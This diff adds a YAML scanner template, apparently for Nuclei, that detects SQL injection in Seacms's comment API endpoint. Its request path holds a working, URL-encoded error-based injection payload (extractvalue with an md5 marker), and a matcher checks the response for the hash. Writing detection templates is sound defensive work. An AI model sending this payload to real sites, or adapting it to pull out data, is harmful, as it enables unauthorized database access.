@@ -1,0 +1,21 @@
+id: poc-yaml-seacms-sqli
+info:
+  name: Seacms SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL Injection vulnerability in Seacms via the `gid` parameter in the `comment/api/index.php` endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@%60%27%60,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@%60%27%60"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "6f7c6dcbc380aac3bcba1f9fccec99"
